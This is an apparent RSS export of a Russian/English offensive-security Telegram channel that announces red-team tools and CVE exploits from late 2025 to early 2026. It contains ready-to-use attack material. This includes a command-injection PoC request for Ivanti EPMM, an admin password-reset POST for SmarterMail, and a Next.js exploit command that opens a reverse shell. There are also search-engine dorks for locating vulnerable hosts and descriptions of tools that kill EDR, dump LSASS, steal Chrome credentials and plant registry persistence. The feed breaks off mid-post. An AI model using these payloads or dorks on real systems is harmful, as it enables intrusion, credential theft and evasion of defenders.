+Threat actors could abuse AppLocker to deploy rules that will prevent EDR processes from execution in order to execute arbitrary commands and software on the asset without EDR disruption.
+
+[Media: Фото]</description><pubDate>Fri, 06 Feb 2026 07:01:58 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_258</guid></item><item><title>GhostKatz</title><link>https://t.me/P0x3k_1N73LL1G3NC3/257</link><description>GhostKatz
+Dump LSASS via physical memory read primitives in vulnerable kernel drivers, bypassing traditional user-mode detection capabilities.
+
+[Media: Видео]</description><pubDate>Wed, 04 Feb 2026 09:27:52 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_257</guid></item><item><title>Backup your boosts!</title><link>https://t.me/P0x3k_1N73LL1G3NC3/256</link><description>Backup your boosts!
+
+[Media: Фото]</description><pubDate>Tue, 03 Feb 2026 07:55:09 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_256</guid></item><item><title>ColdWer</title><link>https://t.me/P0x3k_1N73LL1G3NC3/255</link><description>ColdWer
+Cobalt Strike BOF to freeze EDR/AV processes and dump LSASS using WerFaultSecure.exe PPL bypass.
+
+[Media: Фото]</description><pubDate>Mon, 02 Feb 2026 03:15:02 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_255</guid></item><item><title>Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 &amp; CVE-2026-1340)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/254</link><description>Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 &amp; CVE-2026-1340)
+Code injection issues, allowing a remote unauthenticated attacker to execute arbitrary code on an affected device. The attackers can provide Bash commands as part of a malicious HTTP GET request to the endpoints that service either the “In-House Application Distribution” feature (i.e. /mifs/c/appstore/fob/) or the “Android File Transfer Configuration” feature (i.e. /mifs/c/aftstore/fob/), resulting in arbitrary OS command execution on the target.
+PoC Request:
+GET /mifs/c/appstore/fob/3/5/sha256:kid=1,st=theValue%20%20,
+et=1337133713,h=gPath%5B%60id%20&gt;%20/mi/poc%60%5D/
+13371337-1337-1337-1337-133713371337.ipa HTTP/1.1
+Host: f5-research-lab-ioc-block-it-all.f5
+Affected versions:
+• 12.7.0.0 and prior
+• 12.6.0.0 and prior
+• 12.5.0.0 and prior
+• 12.6.1.0 and prior
+• 12.5.1.0 and prior
+Query:
+ZoomEye: app="Ivanti Endpoint Manager Mobile"
+
+[Media: Фото]</description><pubDate>Fri, 30 Jan 2026 18:59:02 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_254</guid></item><item><title>Новый сканер для обнаружения уязвимостей к NTLM релеям</title><link>https://t.me/P0x3k_1N73LL1G3NC3/253</link><description>Новый сканер для обнаружения уязвимостей к NTLM релеям
+https://github.com/depthsecurity/RelayKing-Depth/
+* Сканирует по SMB, LDAP/S, MSSQL, HTTP/S, RPC, WinRM
+* Находит WebDAV WebClient, CVE-2025-33073 (NTLM reflection), NTLMv1 + всякие PrinterBug, PetitPotam и т.п.
+* Поддерживает аудит всего домена
+* Составляет список таргетов для ntlmrelayx и других софтин.
+* Сохраняет отчет в plaintext/JSON/CSV/Markdown
+Есть статья в блоге: https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/
+#soft #git #ad #pentest #relay
+
+[Media: Фото]</description><pubDate>Fri, 30 Jan 2026 14:34:28 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_253</guid></item><item><title>AudioDG Windows LPE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/252</link><description>AudioDG Windows LPE
+Audiodg.exe DLL hijacking for LPE with reboot-free restart primitive. Executes code as LOCAL SERVICE, escalates to SYSTEM via Scheduled Tasks.
+Blog: Abusing Windows Audio for Local Privilege Escalation
+DLL hijacking in the context of the audiodg.exe process which may load vendor-supplied APO-related DLL dependencies from system paths. Through this it is possible to execute code as “NT AUTHORITY\LOCAL SERVICE” and subsequently escalate to SYSTEM using Scheduled Tasks and Potato techniques.
+
+[Media: Фото]</description><pubDate>Wed, 28 Jan 2026 13:26:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_252</guid></item><item><title>Swarmer</title><link>https://t.me/P0x3k_1N73LL1G3NC3/251</link><description>Swarmer
+A tool for stealthy modification of Windows 10/11 Registry as a low privilege user via offline hive manipulation, avoiding detection by EDRs.
+The workflow is straightforward:
+• Export the target user’s HKCU registry (via reg export or our BOF-based approach)
+• Make whatever modifications you want to the exported data
+• Use Swarmer to convert the modified export into a binary hive
+• Drop the resulting NTUSER.MAN file into the user’s profile directory
+swarmer.exe exported.reg NTUSER.MAN
+Or, if you want to add a startup entry in one shot:
+swarmer.exe --startup-key "Updater" --startup-value "C:\Path\To\payload.exe" exported.reg NTUSER.MAN
+Blog: Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals
+
+[Media: Фото]</description><pubDate>Wed, 28 Jan 2026 04:02:22 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_251</guid></item><item><title>Паровоз который смог</title><link>https://t.me/P0x3k_1N73LL1G3NC3/250</link><description>Паровоз который смог
+
+[Media: Видео]</description><pubDate>Tue, 27 Jan 2026 04:31:56 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_250</guid></item><item><title>https://github.com/zh54321/SharePointDumper</title><link>https://t.me/P0x3k_1N73LL1G3NC3/249</link><description>https://github.com/zh54321/SharePointDumper
+Enumerates all SharePoint sites/drives a user can access via Microsoft Graph, recursively downloads files, and logs every Graph + SharePoint HTTP request for SIEM correlation, detection engineering, and IR testing.
+#soft #ad #git
+
+[Media: Фото]</description><pubDate>Mon, 26 Jan 2026 20:21:21 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_249</guid></item><item><title>2026-24061: Telnetd RCE as Root</title><link>https://t.me/P0x3k_1N73LL1G3NC3/248</link><description>2026-24061: Telnetd RCE as Root
+This flaw allows an attacker to establish a Telnet session without providing valid credentials, granting unauthorized access to the target system. The vulnerability exists all the way up to version 2.7-2 of the GNU telnetd service.
+Exploit: https://github.com/SafeBreach-Labs/CVE-2026-24061
+Query:
+ZoomEye: app="GNU Inetutils telnetd"
+Shodan: product:"telnetd"
+HUNTER: protocol=="telnet"
+
+[Media: Фото]</description><pubDate>Fri, 23 Jan 2026 18:00:55 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_248</guid></item><item><title>Message 247</title><link>https://t.me/P0x3k_1N73LL1G3NC3/247</link><description>
+
+[Media: Фото]</description><pubDate>Fri, 23 Jan 2026 14:14:34 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_247</guid></item><item><title>SmarterTools SmarterMail WT-2026-0001 Auth Bypass + RCE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/246</link><description>SmarterTools SmarterMail WT-2026-0001 Auth Bypass + RCE
+An Authentication Bypass vulnerability, allowing any user to reset the SmarterMail system administrator password. The kicker of course being that said user is able to use RCE-as-a-feature functions to directly execute OS commands.
+POC:
+POST /api/v1/auth/force-reset-password HTTP/1.1
+Host: xxxxxxx:9998
+Content-Type: application/json
+Content-Length: 145
+{"IsSysAdmin":"true",
+"OldPassword":"watever",
+"Username":"admin",
+"NewPassword":"NewPassword123!@#",
+"ConfirmPassword": "NewPassword123!@#"}
+Query:
+FOFA: app="SmarterMail"
+HUNTER : product.name="SmarterMail"
+
+[Media: Фото]</description><pubDate>Thu, 22 Jan 2026 15:15:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_246</guid></item><item><title>Chisel-ng</title><link>https://t.me/P0x3k_1N73LL1G3NC3/245</link><description>Chisel-ng
+A Rust implementation of chisel for penetration testing and red team operations. Establishes reverse tunnels over SSH-over-WebSocket-over-TLS, allowing operators to pivot through compromised hosts while blending with normal HTTPS traffic.
+
+[Media: Фото]</description><pubDate>Thu, 22 Jan 2026 05:48:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_245</guid></item><item><title>TopazTerminator</title><link>https://t.me/P0x3k_1N73LL1G3NC3/244</link><description>TopazTerminator
+This project exploits the vulnerable wsftprm.sys (Topaz Antifraud kernel driver) to terminate protected processes (e.g., antivirus/EDR services) on Windows.
+AV-EDR-Killer
+AV/EDR processes termination by exploiting a vulnerable driver (BYOVD).
+
+[Media: Фото]</description><pubDate>Tue, 20 Jan 2026 11:01:49 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_244</guid></item><item><title>Using NTLM Reflection to Own Active Directory (CVE-2025-33073)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/242</link><description>Using NTLM Reflection to Own Active Directory (CVE-2025-33073)
+Extending NTLM Reflection Attacks to LDAP/LDAPS &amp; (Possibly) RPC Services
+Tool: https://github.com/decoder-it/impacket-partial-mic
+Blog: Reflecting Your Authentication: When Windows Ends Up Talking to Itself
+P.S.: SMB signing / channel binding enforcement does NOT protect against the NTLM reflection attack. We could also perform cross-protocol relays to ADCS enrollment services, MSSQL databases, LDAPS, RPC and WinRMS. (X/Twitter post)
+
+[Media: Фото]</description><pubDate>Sun, 18 Jan 2026 20:06:50 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_242</guid></item><item><title>Closing the Door on Net-NTLMv1: Releasing Rainbow Tables to Accelerate Protocol Deprecation</title><link>https://t.me/P0x3k_1N73LL1G3NC3/239</link><description>Closing the Door on Net-NTLMv1: Releasing Rainbow Tables to Accelerate Protocol Deprecation
+Essentially, if an attacker can obtain a Net-NTLMv1 hash without Extended Session Security (ESS) for the known plaintext of 1122334455667788, a cryptographic attack, referred to as a known plaintext attack (KPA), can be applied. This guarantees recovery of the key material used. Since the key material is the password hash of the authenticating Active Directory (AD) object—user or computer—the attack results can quickly be used to compromise the object, often leading to privilege escalation.
+A common chain attackers use is authentication coercion from a highly privileged object, such as a domain controller (DC). Recovering the password hash of the DC machine account allows for DCSync privileges to compromise any other account in AD.
+Net-NTLMv1 Rainbow Tables
+Rainbow tables generated for the Net-NTLMv1 authentication protocol with the challenge of 1122334455667788 to aid in key recovery
+
+[Media: Фото]</description><pubDate>Sun, 18 Jan 2026 07:57:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_239</guid></item><item><title>Respect</title><link>https://t.me/P0x3k_1N73LL1G3NC3/238</link><description>Respect
+
+[Media: Фото]</description><pubDate>Fri, 16 Jan 2026 08:40:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_238</guid></item><item><title>ConfigManBearPig</title><link>https://t.me/P0x3k_1N73LL1G3NC3/237</link><description>ConfigManBearPig
+PowerShell collector for adding SCCM attack paths to BloodHound with OpenGraph.
+Blog: https://specterops.io/blog/2026/01/13/introducing-configmanbearpig-a-bloodhound-opengraph-collector-for-sccm
+
+[Media: Фото]</description><pubDate>Thu, 15 Jan 2026 04:20:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_237</guid></item><item><title>CVE-2025-64155: Fortinet FortiSIEM Argument Injection to Remote Code Execution.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/236</link><description>CVE-2025-64155: Fortinet FortiSIEM Argument Injection to Remote Code Execution.
+An improper neutralization of special elements used in an os command ('os command injection') vulnerability in Fortinet FortiSIEM 7.4.0, FortiSIEM 7.3.0 through 7.3.4, FortiSIEM 7.1.0 through 7.1.8, FortiSIEM 7.0.0 through 7.0.4, FortiSIEM 6.7.0 through 6.7.10 may allow an unauthenticated attacker to remotely inject arguments, leading to root remote code execution.
+Blog: https://horizon3.ai/attack-research/disclosures/cve-2025-64155-three-years-of-remotely-rooting-the-fortinet-fortisiem/
+Dork:
+ZoomEye: app="Fortinet FortiSIEM"
+HUNTER : product.name="Fortinet FortiSIEM"
+
+[Media: Фото]</description><pubDate>Wed, 14 Jan 2026 11:22:08 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_236</guid></item><item><title>CVE-2025-68921 Windows LPE in Nahimic audio enhancement software</title><link>https://t.me/P0x3k_1N73LL1G3NC3/235</link><description>CVE-2025-68921 Windows LPE in Nahimic audio enhancement software
+A local privilege escalation vulnerability in audio enhancement software pre-installed on many gaming laptops, including Lenovo Legion, IdeaPad Gaming, MSI, Thunderobot, and others. The vulnerability was tracked by Lenovo PSIRT as LEN-18785 and assigned CVE-2025-68921, allowing a low-privileged user to escalate privileges directly to NT AUTHORITY\SYSTEM.
+Blog: https://www.hackandhide.com/cve-2025-68921/
+
+[Media: Фото]</description><pubDate>Wed, 14 Jan 2026 09:59:39 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_235</guid></item><item><title>Всем привет!</title><link>https://t.me/P0x3k_1N73LL1G3NC3/233</link><description>Всем привет!
+Делюсь с вами долгожданной третьей частью Impacket Programming Guide! В этой части мы разобрали основные концепции библиотеки, рассмотрели несколько MSRPC протоколов, а в конце я создал инструмент, который использует кастомный RPC сервер для исполнения команд, что может стать полезно для бокового перемещения : )
+Помимо того, реализовал функционал скачивания/загрузки файлов, ползанья по файловой системе и все это — в интерактивном шелле!
+Статья: https://medium.com/@cicada-8/impacket-developer-guide-part-3-make-your-own-lateral-movement-a2f8181f657b
+POC: https://github.com/CICADA8-Research/RpcMotion
+
+[Media: Фото]</description><pubDate>Tue, 13 Jan 2026 18:26:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_233</guid></item><item><title>EDRStartupHinder</title><link>https://t.me/P0x3k_1N73LL1G3NC3/232</link><description>EDRStartupHinder
+Prevents AV / EDR from running by redirecting a core DLL in the System32 folder to another location during Windows startup.
+Blog: https://www.zerosalarium.com/2026/01/edrstartuphinder-edr-startup-process-blocker.html
+
+[Media: Фото]</description><pubDate>Sun, 11 Jan 2026 08:42:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_232</guid></item><item><title>📄 Catching Credential Guard Off Guard  Credential Guard was supposed to end credential dumping. It didn't. @bytewreck just dropped a new blog post detailing techniques for extracting credentials on...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/231</link><description>📄 Catching Credential Guard Off Guard  Credential Guard was supposed to end credential dumping. It didn't. @bytewreck just dropped a new blog post detailing techniques for extracting credentials on fully patched Windows 11 &amp; Server 2025 with modern protections…
+
+[Media: Видео]</description><pubDate>Sat, 10 Jan 2026 10:33:33 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_231</guid></item><item><title>DumpChromeSecrets  Extract data from modern Chrome versions, including refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/230</link><description>DumpChromeSecrets  Extract data from modern Chrome versions, including refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks.
+
+[Media: Фото]</description><pubDate>Thu, 08 Jan 2026 21:44:33 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_230</guid></item><item><title>Let’s make it possible!</title><link>https://t.me/P0x3k_1N73LL1G3NC3/229</link><description>Let’s make it possible!
+
+[Media: Фото]</description><pubDate>Thu, 08 Jan 2026 07:39:36 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_229</guid></item><item><title>CVE-2026-21858 + CVE-2025-68613: n8n Ni8mare - Full Chain Exploit (CVSS 10.0)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/228</link><description>CVE-2026-21858 + CVE-2025-68613: n8n Ni8mare - Full Chain Exploit (CVSS 10.0)
+Unauthenticated to Root RCE:
+- LFI via Content-Type confusion
+- Read /proc/self/environ to find HOME
+- Steal encryption key + database
+- Forge admin JWT token
+- Expression injection sandbox bypass
+- RCE as root
+Query:
+FOFA: app="n8n"
+HUNTER : product.name="N8n"
+ZoomEye: app="n8n"
+
+[Media: Фото]</description><pubDate>Wed, 07 Jan 2026 20:53:28 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_228</guid></item><item><title>TaskHound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/227</link><description>TaskHound
+TaskHound hunts for Windows scheduled tasks that run with privileged accounts and stored credentials. It enumerates tasks over SMB, parses XMLs, and identifies high-value attack opportunities through BloodHound integration.
+Blog: https://r0bit.io/posts/taskhound.html
+
+[Media: Фото]</description><pubDate>Tue, 06 Jan 2026 12:16:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_227</guid></item><item><title>Chronomaly — Android / Linux Kernel LPE exploit (CVE-2025-38352)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/226</link><description>Chronomaly — Android / Linux Kernel LPE exploit (CVE-2025-38352)
+The exploit was written specifically for Linux kernel v5.10.157, but should work against all vulnerable v5.10.x kernels, as it does not require any specific kernel text offsets to work.
+Blog:
+• Part 1 - In-the-wild Android Kernel Vulnerability Analysis + PoC
+• Part 2 - Extending The Race Window Without a Kernel Patch
+• Part 3 - Uncovering Chronomaly
+
+[Media: Видео]</description><pubDate>Mon, 05 Jan 2026 11:44:53 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_226</guid></item><item><title>ESC17: Using ADCS to Attack HTTPS-Enabled WSUS Clients</title><link>https://t.me/P0x3k_1N73LL1G3NC3/225</link><description>ESC17: Using ADCS to Attack HTTPS-Enabled WSUS Clients
+How to leverage misconfigured ADCS templates to gain code execution on HTTPS-enabled WSUS clients.
+
+[Media: Фото]</description><pubDate>Mon, 05 Jan 2026 06:01:29 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_225</guid></item><item><title>Profilehound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/224</link><description>Profilehound
+BloodHound OpenGraph collector for user profiles stored on domain machines. Make informed decisions about looting secrets by identifying active user profiles on domain machines.
+P.S.
+BloodHound's HasSession edge is great, but it's only useful when a user is logged into a machine. If a user is not logged into a machine when the data is collected, it's much more difficult to find which computer may contain secrets to facilitate further exploitation. User profiles may contain a significant amount of valuable intel within DPAPI, cached credentials, SSH keys, cloud keys, and more - these don't require an active user session to access.
+
+[Media: Фото]</description><pubDate>Wed, 31 Dec 2025 12:33:40 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_224</guid></item><item><title>MongoBleed (CVE-2025-14847) - Unauthenticated Memory Leak PoC</title><link>https://t.me/P0x3k_1N73LL1G3NC3/223</link><description>MongoBleed (CVE-2025-14847) - Unauthenticated Memory Leak PoC
+A flaw in the zlib library enables attackers to leak sensitive data from MongoDB servers, the attacker can send the payload, without authentication, as the bug is exploited on the network level.
+Attackers can exploit this to extract sensitive information from MongoDB servers, including user information, passwords, API keys and more. Although the attacker might need to send a large amount of requests to gather the full database, and some data might be meaningless, the more time an attacker has the more information could be gathered.
+Blog: https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/
+Dork:
+Shodan: product:"MongoDB"
+HUNTER: product.name="MongoDB"
+ZoomEye Dork: app="MongoDB"
+Affected versions:
+8.2.0 to 8.2.2
+8.0.0 to 8.0.16
+7.0.0 to 7.0.27
+6.0.0 to 6.0.26
+5.0.0 to 5.0.31
+4.4.0 to 4.4.29
+4.2.0 and later
+4.0.0 and later
+3.6.0 and later
+
+[Media: Фото]</description><pubDate>Sat, 27 Dec 2025 14:25:21 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_223</guid></item><item><title>DumpChromeSecrets</title><link>https://t.me/P0x3k_1N73LL1G3NC3/222</link><description>DumpChromeSecrets
+Extract data from modern Chrome versions, including refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks.
+
+[Media: Фото]</description><pubDate>Thu, 25 Dec 2025 05:56:39 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_222</guid></item><item><title>Nezha</title><link>https://t.me/P0x3k_1N73LL1G3NC3/221</link><description>Nezha
+A legitimate open-source monitoring tool (post-exploitation RAT). Compatible with mainstream systems, including Linux, Windows, macOS, OpenWRT, and Synology. The agent provides SYSTEM/root level access, file management, and an interactive web terminal. VirusTotal shows 0/72 detections because it isn’t malware, it’s legitimate software pointed at attacker infrastructure.
+Installation is silent. Detection only occurs when attackers execute commands through the agent.
+Wiki: https://nezha.wiki/en_US/
+Research: https://www.ontinue.com/resource/nezha-the-monitoring-tool-thats-also-a-perfect-rat/
+
+[Media: Фото]</description><pubDate>Wed, 24 Dec 2025 14:10:21 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_221</guid></item><item><title>TokenFlare</title><link>https://t.me/P0x3k_1N73LL1G3NC3/220</link><description>TokenFlare
+Serverless AITM Simulation Framework for Entra ID and M365
+Blog: https://labs.jumpsec.com/tokenflare-serverless-AiTM-phishing-in-under-60-seconds/
+
+[Media: Видео]</description><pubDate>Mon, 05 Jan 2026 05:00:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_220</guid></item><item><title>Boost если не охранник</title><link>https://t.me/P0x3k_1N73LL1G3NC3/219</link><description>Boost если не охранник
+
+[Media: Фото]</description><pubDate>Sun, 21 Dec 2025 16:02:10 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_219</guid></item><item><title>boflink</title><link>https://t.me/P0x3k_1N73LL1G3NC3/218</link><description>boflink
+Boflink is a tool designed to act as a sort of fill-in for the missing linking stage that comes with the BOF development process. It is a linker that takes unmodified object files generated by a compiler and links them together into a Beacon Object File capable of being loaded by a BOF loader.
+Its main goal is to act as a bridge between the BOF development and the BOF loading process to help simplify them.
+Blog: Boflink: A Linker For Beacon Object Files
+
+[Media: Фото]</description><pubDate>Sun, 21 Dec 2025 08:50:42 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_218</guid></item><item><title>GitHubDeviceCodePhishing</title><link>https://t.me/P0x3k_1N73LL1G3NC3/217</link><description>GitHubDeviceCodePhishing
+A tool that provides a web interface to easily perform GitHub Device Code phishing on red team engagements.
+Blog: Introducing: GitHub Device Code Phishing
+
+[Media: Фото]</description><pubDate>Sat, 20 Dec 2025 15:01:37 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_217</guid></item><item><title>Moonwalk++</title><link>https://t.me/P0x3k_1N73LL1G3NC3/216</link><description>Moonwalk++
+A PoC implementation of an enahnced version of StackMoonwalk, which combines its original technique to remove the caller from the call stack, with a memory self-encryption routine, using ROP to both desynchronize unwinding from control flow and simultaneously encrypt the executing shellcode to hide it from inpection.
+Blog Post: Malware Just Got Its Free Passes Back!.
+
+[Media: Видео]</description><pubDate>Sat, 20 Dec 2025 07:22:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_216</guid></item><item><title>CVE-2025-37164: Unauthenticated RCE in HPE OneView.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/214</link><description>CVE-2025-37164: Unauthenticated RCE in HPE OneView.
+Unauthenticated RCE (10.0 CVSS) vulnerability, in Hewlett Packard Enterprise (HPE) OneView via an unauthenticated REST endpoint called executeCommand. All versions below 11.00 are vulnerable (so long as the vendor supplied hotfix has not been applied), however some VM product versions do not enable the vulnerable "ID Pools" endpoint, and are not exploitable.
+Blog: https://attackerkb.com/topics/ixWdbDvjwX/cve-2025-37164/rapid7-analysis
+ZoomEye Dork: app="HPE OneView"
+P.S. When testing HPE OneView version 6.60, you can elevate to root by exploiting CVE-2021-4034. It's unknown if that will work against more recent OneView appliance versions.
+
+[Media: Фото]</description><pubDate>Fri, 19 Dec 2025 18:03:12 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_214</guid></item><item><title>Message 213</title><link>https://t.me/P0x3k_1N73LL1G3NC3/213</link><description>
+
+[Media: Фото]</description><pubDate>Fri, 19 Dec 2025 14:05:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_213</guid></item><item><title>ESC1-unPAC (BOF)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/212</link><description>ESC1-unPAC (BOF)
+A Beacon Object File (BOF) that performs the complete ESC1 attack chain in a single execution: certificate request with arbitrary SAN (+SID), PKINIT authentication, and NT hash extraction via UnPAC-the-hash.
+
+[Media: Фото]</description><pubDate>Fri, 19 Dec 2025 06:16:39 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_212</guid></item><item><title>#cve #rce</title><link>https://t.me/P0x3k_1N73LL1G3NC3/211</link><description>#cve #rce
+Microsoft Web Deploy RCE Exploit - CVE-2025-53772
+https://github.com/sailay1996/CVE-2025-53772/tree/main
+Telegram  ✉️ @freedomfox
+
+[Media: Фото]</description><pubDate>Thu, 11 Dec 2025 18:20:27 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_211</guid></item><item><title>📄 SCOMmand and Conquer – Attacking System Center Operations Manager (Part 1)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/208</link><description>📄 SCOMmand and Conquer – Attacking System Center Operations Manager (Part 1)
+SCOM suffers from similar insecure default configurations as its SCCM counterpart, enabling attackers to escalate privileges, harvest credentials, and ultimately compromise the entire management group and its monitored infrastructure.
+🔗 Scomhunter
+SCOMHunter is a post-ex tool for enumerating and attacking System Center Operations Manager (SCOM) infrastructure.
+🔗 SCOMHound
+A BloodHound OpenGraph proof of concept extension for enumerating System Center Operations Manager (SCOM) infrastructure from Active Directory.
+📄 SCOMmand And Conquer – Attacking System Center Operations Manager (Part 2)
+We found that SCOM RunAs credentials could be obtained on-host and also off-host in certain configurations and wrote a tool to help automate their recovery.
+🔗 SharpSCOM
+A C# utility for interacting with SCOM
+
+[Media: Фото]</description><pubDate>Thu, 11 Dec 2025 11:01:51 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_208</guid></item><item><title>🦊 All fox are beautiful ;)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/207</link><description>🦊 All fox are beautiful ;)
+
+[Media: Фото]</description><pubDate>Thu, 11 Dec 2025 09:02:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_207</guid></item><item><title>BreakFAST - Kerberos FAST Armoring Abuse</title><link>https://t.me/P0x3k_1N73LL1G3NC3/206</link><description>BreakFAST - Kerberos FAST Armoring Abuse
+Proof of concept for abusing Kerberos Armoring, a.k.a FAST (Flexible Authentication Secure Tunneling) Armoring (MS-KILE/RFC-6113). This can be used in post-ex lateral movement in environments where Kerberos FAST armoring is enabled and preventing you from using your favorite tools such as GetTGT.py, psexec.py or evil-winrm.
+P.S. In a hardened domain where NTLMauthentication is disabled and Kerberos armoring is enabled, you cannot obtain a TGT remotely because your host is not domain-joined, and you cannot use NTLM authentication, even with the correct password.
+If you have previously compromised a domain-joined system and recovered its long term secret by dumping LSA, you can forge armored ticket requests and use them remotely.
+Blog about FAST: https://www.trustedsec.com/blog/i-wanna-go-fast-really-fast-like-kerberos-fast
+
+[Media: Фото]</description><pubDate>Wed, 10 Dec 2025 10:56:03 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_206</guid></item><item><title>CVE-2025-12744: Local Privilege Escalation in Fedora Linux via ABRT.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/205</link><description>CVE-2025-12744: Local Privilege Escalation in Fedora Linux via ABRT.
+The ABRT (Automatic Bug Reporting Tool) daemon is a root process that runs an HTTP server on a world-writable UNIX socket to accept error reports from any process. It passes 12 characters of user-controlled text directly into a shell command, with minimal validation. Using a specially crafted multi-stage payload, an attacker can force the ABRT daemon to run arbitrary shell commands. This includes escaping ABRT’s systemd sandbox and gaining complete control over the system.
+Writeup: https://initblog.com/2025/abrt-root/
+POC: https://github.com/initstring/abrt_root
+
+[Media: Фото]</description><pubDate>Sun, 07 Dec 2025 06:50:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_205</guid></item><item><title>Рабочий эксплоит</title><link>https://t.me/P0x3k_1N73LL1G3NC3/204</link><description>Рабочий эксплоит
+Спустя сутки после тряски с нейрослопом, его, наконец, написали https://github.com/Spritualkb/CVE-2025-55182-exp (сырой запрос можно найти тут). Работает на любом уязвимом приложении из коробки, я уже проверил сам.
+Получить шелл в одну команду можно так
+python3 exp.py http://127.0.0.1:3000 --revshell 127.0.0.1 1234
+Предварительно надо не забыть поднять слушатель (не смотря на надпись, сам скрипт этого не делает).
+Сейчас в интернете находится 8.7 миллионов потенциально уязвимых инстансов, — 69% всех облачных сред используют Next.js — это каждый второй прод в облаке.
+Чтобы не проверять их все вручную, для Burp написали готовое расширение, которое проверяет уязвимость в фоне https://github.com/tobiasGuta/Next.js-RSC-RCE-Scanner-Burp-Suite-Extension (в active scan++ тоже добавили)
+
+[Media: Фото]</description><pubDate>Fri, 05 Dec 2025 11:53:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_204</guid></item><item><title>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/203</link><description>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)
